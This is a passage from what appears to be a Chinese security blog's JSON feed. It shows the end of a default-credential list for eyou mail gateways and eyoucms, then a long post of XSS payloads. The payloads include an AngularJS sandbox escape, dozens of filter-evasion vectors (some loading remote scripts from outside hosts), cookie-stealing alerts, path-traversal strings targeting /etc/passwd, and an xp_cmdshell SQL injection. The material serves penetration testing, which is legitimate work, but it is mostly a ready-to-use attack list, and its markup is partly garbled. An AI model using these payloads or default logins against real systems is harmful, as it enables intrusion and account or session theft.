其他</h2>\n<ul>\n<li>eyou邮件网关:</li>\n</ul>\n<div><pre><code>  admin/+-ccccc\n  eyougw/admin@(eyou)\n  eyouuser/eyou_admin\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><ul>\n<li>eyoucms:</li>\n</ul>\n<div><pre><code>  admin/admin\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"默认密码在线查询网站\"> 默认密码在线查询网站</h2>\n<p>CIRT.net\nhttps://cirt.net/passwords</p>\n<h2 id=\"默认密码列表\"> 默认密码列表</h2>\n<p>https://datarecovery.com/rd/default-passwords/</p>\n<h2 id=\"工具猫路由器默认密码查询\"> 工具猫路由器默认密码查询</h2>\n<p>https://toolmao.com/baiduapp/routerpwd/</p>\n<h2 id=\"路由器默认密码查询\"> 路由器默认密码查询</h2>\n<p>https://www.cleancss.com/router-default/</p>\n<h2 id=\"internet上最全面的默认路由器密码列表\"> Internet上最全面的默认路由器密码列表</h2>\n<p>https://portforward.com/router-password/</p>\n",
      "date_published": "2021-08-17T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "XSS payload",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/7.XSS%E6%BC%8F%E6%B4%9E/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/7.XSS%E6%BC%8F%E6%B4%9E/",
      "content_html": "<p>AngularJS沙箱逃逸</p>\n<div><pre><code>验证：\n  {{3*3}}\n\npayload:\n  {{&#39;a&#39;.constructor.prototype.charAt=[].join;$eval(&#39;x=1} } };alert(1)//&#39;);}}\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><p>script、input中：</p>\n<div><pre><code>' οninput<span>=</span>alert<span><span>`</span><span>1</span><span>`</span></span>        <span>// 当要在input中输入内容时触发事件</span>\n<span>' οninput=alert`1` '</span>      <span>// 同上</span>\n' οnchange<span>=</span>alert<span><span>`</span><span>1</span><span>`</span></span>       <span>// 发生改变的时候触发该事件</span>\n<span>' οnchange=alert`1` '</span>     <span>// 同上</span>\n<span>' onmouseover=alert`1` '</span>  <span>// 鼠标移动到上方</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><div><pre><code><span>1</span><span>)</span>普通的<span>XSS</span> JavaScript注入\n<span>&lt;</span><span>SCRIPT</span> <span>SRC</span><span>=</span>http<span>:</span><span>/</span><span>/</span><span>3</span>w<span>.</span>org<span>/</span><span>XSS</span><span>/</span>xss<span>.</span>js<span>></span><span></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span>\n\n<span>(</span><span>2</span><span>)</span><span>IMG</span>标签<span>XSS</span>使用JavaScript命令\n<span>&lt;</span><span>SCRIPT</span> <span>SRC</span><span>=</span>http<span>:</span><span>/</span><span>/</span><span>3</span>w<span>.</span>org<span>/</span><span>XSS</span><span>/</span>xss<span>.</span>js<span>></span><span></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span>\n\n<span>(</span><span>3</span><span>)</span><span>IMG</span>标签无分号无引号\n<span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>javascript:alert(‘XSS’)</span><span>></span></span><span>\n\n(4)IMG标签大小写不敏感\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>JaVaScRiPt:alert(‘XSS’)</span><span>></span></span><span>\n\n(5)HTML编码(必须有分号)\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>javascript:alert(“XSS”)</span><span>></span></span><span>\n\n(6)修正缺陷IMG标签\n&lt;IMG “”\"></span><span><span><span>&lt;</span><span>SCRIPT</span></span><span>></span></span><span>alert(“XSS”)</span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>”>\n\n(7)formCharCode标签(计算器)\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>javascript:alert(String.fromCharCode(88,83,83))</span><span>></span></span><span>\n\n(8)UTF-8的Unicode编码(计算器)\n&lt;IMG SRC=jav..省略..S')>\n\n(9)7位的UTF-8的Unicode编码是没有分号的(计算器)\n&lt;IMG SRC=jav..省略..S')>\n\n(10)十六进制编码也是没有分号(计算器)\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span><span>></span></span><span>\n\n(11)嵌入式标签,将Javascript分开\n&lt;IMG SRC=”jav ascript:alert(‘XSS’);”>\n\n(12)嵌入式编码标签,将Javascript分开\n&lt;IMG SRC=”jav ascript:alert(‘XSS’);”>\n\n(13)嵌入式换行符\n&lt;IMG SRC=”jav ascript:alert(‘XSS’);”>\n\n(14)嵌入式回车\n&lt;IMG SRC=”jav ascript:alert(‘XSS’);”>\n\n(15)嵌入式多行注入JavaScript,这是XSS极端的例子\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>”javascript:alert(‘XSS‘)”</span><span>></span></span><span>\n\n(16)解决限制字符(要求同页面)\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=’document.’</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=z+’write(“‘</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=z+’&lt;script’</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=z+’ src=ht’</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=z+’tp://ww’</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=z+’w.shell’</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=z+’.net/1.’</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=z+’js>&lt;/sc’</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>z=z+’ript>”)’</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>eval_r(z)</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n(17)空字符\nperl -e ‘print “</span><span><span><span>&lt;</span><span>IMG</span></span> <span>SRC</span><span><span>=</span>java\\0script:alert(\\”XSS\\”)</span><span>></span></span><span>”;’ > out\n\n(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用\nperl -e ‘print “&lt;SCR\\0IPT>alert(\\”XSS\\”)&lt;/SCR\\0IPT>”;’ > out\n\n(19)Spaces和meta前的IMG标签\n&lt;IMG SRC=” javascript:alert(‘XSS’);”>\n\n(20)Non-alpha-non-digit XSS\n&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n(21)Non-alpha-non-digit XSS to 2\n&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(“XSS”)>\n\n(22)Non-alpha-non-digit XSS to 3\n&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”>&lt;/SCRIPT>\n\n(23)双开括号\n&lt;&lt;SCRIPT>alert(“XSS”);//&lt;&lt;/SCRIPT>\n\n(24)无结束脚本标记(仅火狐等浏览器)\n&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B>\n\n(25)无结束脚本标记2\n&lt;SCRIPT SRC=//3w.org/XSS/xss.js>\n\n(26)半开的HTML/JavaScript XSS\n&lt;IMG SRC=”javascript:alert(‘XSS’)”\n\n(27)双开角括号\n&lt;iframe src=http://3w.org/XSS.html &lt;\n\n(28)无单引号 双引号 分号\n&lt;SCRIPT>a=/XSS/\nalert(a.source)&lt;/SCRIPT>\n\n(29)换码过滤的JavaScript\n\\”;alert(‘XSS’);//\n\n(30)结束Title标签\n&lt;/TITLE>&lt;SCRIPT>alert(“XSS”);&lt;/SCRIPT>\n\n(31)Input Image\n&lt;INPUT SRC=”javascript:alert(‘XSS’);”>\n\n(32)BODY Image\n&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”>\n\n(33)BODY标签\n&lt;BODY(‘XSS’)>\n\n(34)IMG Dynsrc\n&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”>\n\n(35)IMG Lowsrc\n&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”>\n\n(36)BGSOUND\n&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”>\n\n(37)STYLE sheet\n&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>\n\n(38)远程样式表\n&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>\n\n(39)List-style-image(列表式)\n&lt;STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}&lt;/STYLE>&lt;UL>&lt;LI>XSS\n\n(40)IMG VBscript\n&lt;IMG SRC=’vbscript:msgbox(“XSS”)’>&lt;/STYLE>&lt;UL>&lt;LI>XSS\n\n(41)META链接url\n&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”>\n\n(42)Iframe\n&lt;IFRAME SRC=”javascript:alert(‘XSS’);”>&lt;/IFRAME>\n(43)Frame\n&lt;FRAMESET>&lt;FRAME SRC=”javascript:alert(‘XSS’);”>&lt;/FRAMESET>\n\n(44)Table\n&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”>\n\n(45)TD\n&lt;TABLE>&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”>\n\n(46)DIV background-image\n&lt;DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>\n\n(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)\n&lt;DIV STYLE=”background-image: url( javascript:alert(‘XSS’))”>\n\n(48)DIV expression\n&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”>\n\n(49)STYLE属性分拆表达\n&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”>\n\n(50)匿名STYLE(组成:开角号和一个字母开头)\n&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”>\n\n(51)STYLE background-image\n&lt;STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A>\n\n(52)IMG STYLE方式\nexppression(alert(“XSS”))’>\n\n(53)STYLE background\n&lt;STYLE>&lt;STYLE type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}&lt;/STYLE>\n\n(54)BASE\n&lt;BASE HREF=”javascript:alert(‘XSS’);//”>\n\n(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS\n&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” >&lt;/EMBED>\n\n(56)在flash中使用ActionScrpt可以混进你XSS的代码\na=”get”;\nb=”URL(\\”\";\nc=”javascript:”;\nd=”alert(‘XSS’);\\”)”;\neval_r(a+b+c+d);\n\n(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上\n&lt;HTML xmlns:xss>\n&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”>\n&lt;xss:xss>XSS&lt;/xss:xss>\n&lt;/HTML>\n\n(58)如果过滤了你的JS你可以在图片里添加JS代码来利用\n&lt;SCRIPT SRC=””>&lt;/SCRIPT>\n\n(59)IMG嵌入式命令,可执行任意命令\n&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”>\n\n(60)IMG嵌入式命令(a.jpg在同服务器)\nRedirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser\n\n(61)绕符号过滤\n&lt;SCRIPT a=”>” SRC=”http://3w.org/xss.js”>&lt;/SCRIPT>\n\n(62)\n&lt;SCRIPT =”>” SRC=”http://3w.org/xss.js”>&lt;/SCRIPT>\n\n(63)\n&lt;SCRIPT a=”>” ” SRC=”http://3w.org/xss.js”>&lt;/SCRIPT>\n\n(64)\n&lt;SCRIPT “a=’>’” SRC=”http://3w.org/xss.js”>&lt;/SCRIPT>\n\n(65)\n&lt;SCRIPT a=`>` SRC=”http://3w.org/xss.js”></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n(66)\n</span><span><span><span>&lt;</span><span>SCRIPT</span></span> <span>a</span><span><span>=</span>”</span><span>></span></span><span>’>” SRC=”http://3w.org/xss.js”></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n(67)\n</span><span><span><span>&lt;</span><span>SCRIPT</span></span><span>></span></span><span>document.write(“&lt;SCRI”);</span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>PT SRC=”http://3w.org/xss.js”></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n(68)URL绕行\n&lt;A HREF=”http://127.0.0.1/”>XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n(69)URL编码\n&lt;A HREF=”http://3w.org”>XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n(70)IP十进制\n&lt;A HREF=”http://3232235521″>XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n(71)IP十六进制\n&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″>XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n(72)IP八进制\n&lt;A HREF=”http://0300.0250.0000.0001″>XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n(73)混合编码\n&lt;A HREF=”h\ntt p://6 6.000146.0×7.147/”\">XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n(74)节省[http:]\n&lt;A HREF=”//www.google.com/”>XSS&lt;/A>\n\n(75)节省[www]\n&lt;A HREF=”http://google.com/”>XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n(76)绝对点绝对DNS\n&lt;A HREF=”http://www.google.com./”>XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n(77)javascript链接\n&lt;A HREF=”javascript:document.location=’http://www.google.com/’”>XSS</span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n</span></code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br><span>153</span><br><span>154</span><br><span>155</span><br><span>156</span><br><span>157</span><br><span>158</span><br><span>159</span><br><span>160</span><br><span>161</span><br><span>162</span><br><span>163</span><br><span>164</span><br><span>165</span><br><span>166</span><br><span>167</span><br><span>168</span><br><span>169</span><br><span>170</span><br><span>171</span><br><span>172</span><br><span>173</span><br><span>174</span><br><span>175</span><br><span>176</span><br><span>177</span><br><span>178</span><br><span>179</span><br><span>180</span><br><span>181</span><br><span>182</span><br><span>183</span><br><span>184</span><br><span>185</span><br><span>186</span><br><span>187</span><br><span>188</span><br><span>189</span><br><span>190</span><br><span>191</span><br><span>192</span><br><span>193</span><br><span>194</span><br><span>195</span><br><span>196</span><br><span>197</span><br><span>198</span><br><span>199</span><br><span>200</span><br><span>201</span><br><span>202</span><br><span>203</span><br><span>204</span><br><span>205</span><br><span>206</span><br><span>207</span><br><span>208</span><br><span>209</span><br><span>210</span><br><span>211</span><br><span>212</span><br><span>213</span><br><span>214</span><br><span>215</span><br><span>216</span><br><span>217</span><br><span>218</span><br><span>219</span><br><span>220</span><br><span>221</span><br><span>222</span><br><span>223</span><br><span>224</span><br><span>225</span><br><span>226</span><br><span>227</span><br><span>228</span><br><span>229</span><br><span>230</span><br><span>231</span><br><span>232</span><br><span>233</span><br><span>234</span><br><span>235</span><br><span>236</span><br><span>237</span><br><span>238</span><br><span>239</span><br><span>240</span><br><span>241</span><br><span>242</span><br><span>243</span><br><span>244</span><br><span>245</span><br><span>246</span><br><span>247</span><br></div></div><div><pre><code><span>1</span>'\"<span>(</span><span>)</span><span>&amp;</span><span>%</span><span><span><span>&lt;</span>acx</span><span>></span></span><span><span><span>&lt;</span><span>ScRiPt</span></span> <span>></span></span><span>prompt(915149)</span><span><span><span>&lt;/</span><span>ScRiPt</span></span><span>></span></span><span>\n\n&lt;svg/onload=alert(1)>\n\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert(document.cookie)</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n'></span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert(document.cookie)</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n='></span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert(document.cookie)</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert(vulnerable)</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n%3Cscript%3Ealert('XSS')%3C/script%3E\n\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert('XSS')</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>)<span>\"</span></span><span>></span></span><span>\n\n%0a%0a</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert(\\\"Vulnerable\\\")</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>.jsp\n\n%22%3cscript%3ealert(%22xss%22)%3c/script%3e\n\n%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n\n%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini\n\n%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e\n\n%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e\n\n%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html\n\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert('Vulnerable');</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert('Vulnerable')</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\na.jsp/</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert('Vulnerable')</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\na?</span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert('Vulnerable')</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n\"></span><span><span><span>&lt;</span>script</span><span>></span></span><span>alert('Vulnerable')</span><span><span><span>&lt;/</span>script</span><span>></span></span><span>\n\n';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\\inetpub\\wwwroot\\?.txt'--&amp;&amp;\n\n%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E\n\n%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;\n\n%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=</span><span>{</span><span>SESSION_ID</span><span>}</span><span>&amp;SESSION_ID=\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n&lt;IMG src=javascript:alert('XSS')>\n\n&lt;IMG src=JaVaScRiPt:alert('XSS')>\n\n&lt;IMG src=JaVaScRiPt:alert(\"XSS\")>\n\n&lt;IMG src=javascript:alert('XSS')>\n\n&lt;IMG src=javascript:alert('XSS')>\n\n&lt;IMG src=javascript:alert('XSS')>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>\"</span>jav ascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>\"</span>jav ascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>\"</span>jav ascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n\"&lt;IMG src=java\\0script:alert(\\\"XSS\\\")>\";' > out\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>\"</span> javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>SCRIPT</span></span><span>></span></span><span>a=/XSS/alert(a.source)</span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>BODY</span></span> <span>BACKGROUND</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>)<span>\"</span></span><span>></span></span><span>\n\n&lt;BODY ONLOAD=alert('XSS')>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>DYNSRC</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>)<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>LOWSRC</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>)<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>BGSOUND</span></span> <span>src</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span>br</span> <span>size</span><span><span>=</span><span>\"</span>&amp;{alert(<span>'</span>XSS<span>'</span>)}<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>LAYER</span></span> <span>src</span><span><span>=</span><span>\"</span>http://xss.ha.ckers.org/a.js<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>layer</span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>LINK</span></span> <span>REL</span><span><span>=</span><span>\"</span>stylesheet<span>\"</span></span> <span>href</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>'</span>vbscript:msgbox(<span>\"</span>XSS<span>\"</span>)<span>'</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>\"</span>mocha:[code]<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span>src</span><span><span>=</span><span>\"</span>livescript:[code]<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>META</span></span> <span>HTTP-EQUIV</span><span><span>=</span><span>\"</span>refresh<span>\"</span></span> <span>CONTENT</span><span><span>=</span><span>\"</span>0;url=javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n&lt;IFRAME src=javascript:alert('XSS')></span><span><span><span>&lt;/</span><span>IFRAME</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>FRAMESET</span></span><span>></span></span><span>&lt;FRAME src=javascript:alert('XSS')></span><span><span><span>&lt;/</span><span>FRAME</span></span><span>></span></span><span><span><span>&lt;/</span><span>FRAMESET</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>TABLE</span></span> <span>BACKGROUND</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>)<span>\"</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>DIV</span></span> <span><span>STYLE</span><span><span>=</span><span>\"</span><span><span>background-image</span><span>:</span> <span>url</span><span>(</span><span>javascript</span><span>:</span><span>alert</span><span>(</span><span>'XSS'</span><span>)</span><span>)</span></span><span>\"</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>DIV</span></span> <span><span>STYLE</span><span><span>=</span><span>\"</span><span><span>behaviour</span><span>:</span> <span><span>url</span><span>(</span><span>'http://www.how-to-hack.org/exploit.html'</span><span>)</span></span><span>;</span></span><span>\"</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>DIV</span></span> <span><span>STYLE</span><span><span>=</span><span>\"</span><span><span>width</span><span>:</span> <span>expression</span><span>(</span><span>alert</span><span>(</span><span>'XSS'</span><span>)</span><span>)</span><span>;</span></span><span>\"</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>STYLE</span></span><span>></span></span><span>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</span><span><span><span>&lt;/</span><span>STYLE</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>IMG</span></span> <span><span>STYLE</span><span><span>=</span><span>'</span><span><span>xss</span><span>:</span>expre\\<span>ssion</span><span>(</span><span>alert</span><span>(</span><span>\"XSS\"</span><span>)</span><span>)</span></span><span>'</span></span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>STYLE</span></span> <span>TYPE</span><span><span>=</span><span>\"</span>text/javascript<span>\"</span></span><span>></span></span><span>alert('XSS');</span><span><span><span>&lt;/</span><span>STYLE</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>STYLE</span></span> <span>TYPE</span><span><span>=</span><span>\"</span>text/css<span>\"</span></span><span>></span></span><span>.XSS{background-image:url(\"javascript:alert('XSS')\");}</span><span><span><span>&lt;/</span><span>STYLE</span></span><span>></span></span><span><span><span>&lt;</span><span>A</span></span> <span>class</span><span><span>=</span><span>\"</span>XSS<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span><span>A</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>STYLE</span></span> <span>type</span><span><span>=</span><span>\"</span>text/css<span>\"</span></span><span>></span></span><span>BODY{background:url(\"javascript:alert('XSS')\")}</span><span><span><span>&lt;/</span><span>STYLE</span></span><span>></span></span><span>\n\n</span><span><span><span>&lt;</span><span>BASE</span></span> <span>href</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);//<span>\"</span></span><span>></span></span><span>\n\ngetURL(\"javascript:alert('XSS')\")\n\na=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('XSS');\";eval(a+b+c+d);\n\n</span><span><span><span>&lt;</span><span>XML</span></span> <span>src</span><span><span>=</span><span>\"</span>javascript:alert(<span>'</span>XSS<span>'</span>);<span>\"</span></span><span>></span></span><span>\n\n\"> &lt;BODY>&lt;SCRIPT>function a(){alert('XSS');}&lt;/SCRIPT>&lt;\"\n\n</span><span><span><span>&lt;</span><span>SCRIPT</span></span> <span>src</span><span><span>=</span><span>\"</span>http://xss.ha.ckers.org/xss.jpg<span>\"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span><span>SCRIPT</span></span><span>></span></span><span>\n\n&lt;IMG 